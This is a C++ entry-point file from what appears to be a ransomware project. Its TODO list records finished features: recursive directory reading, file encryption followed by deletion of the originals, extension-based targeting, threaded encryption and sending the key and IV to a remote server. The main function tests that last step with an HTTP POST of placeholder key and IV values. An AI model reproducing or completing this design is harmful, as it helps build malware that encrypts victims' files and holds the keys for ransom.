#include <iostream>
#include <algorithm>
#include <filesystem>
#include <string>

namespace fs = std::filesystem;
using std::cout;
using std::cerr;
using std::endl;
using std::string;

#include "Crypter.h"
#include "Timer.h"

/*
 * TODO:
 *  1)  Recursive dir read                      +++
 *  2)  Encrypt file                            +++
 *  3)  Find a way to read all bits             +++
 *  4)  Delete file                             +++
 *  5)  Decrypt file                            +++
 *  6)  AES CB (plus auto padding)              +++
 *  7)  Try loading few GB file                 +++
 *  8)  Separate encrypt, decrypt               +++
 *  9)  Storage format? (not bin I guess)
 *  10) Why pdf failing? Much smaller out       +++
 *  11) How to encrypt large files?             +++
 *  12) How to handle not opened files?
 *  13) Decrypt with set cipher length          +++
 *  14) Search by extension method              +++
 *  15) Threading encryption                    +++
 *  16) List of extensions
 *  17) Crypter class (beautiful:)              +++
 *  18) Benchmarking                            +++
 *  19) Set entry point, OS dependant
 *  20) Hex to Key conversion                   +++
 *  21) Remote call to server (send key, iv)    +++
 *  22) Write/Read at the same time             +++
 *  23) Crypter launch method                   +++
 *  24) Crypter constructor with key and iv
 *  25) Crypter get beautiful key method        +++
 *  26) Crypter get beautiful IV method         +++
 *  27) Crypter load files method               +++
 *  28) Compile for windows
 *  29) Test on windows
 *  30)
 *  31)
 *
 *
*/

#include <test.h>

int main(int argc, char *argv[])
{
//    auto _ = LC::Timer("Main bench");
//
//    Crypter badboy;

    httplib::Client cli("localhost", 1234);
    httplib::Params params;

    params.emplace("key", "someKey");
    params.emplace("iv", "asd");

    auto res = cli.Post("/", params);

    if (res && res->status == 200) {
        cout << "Remote response: " << endl;
        cout << res->body << endl;
    }


    return 0;
}

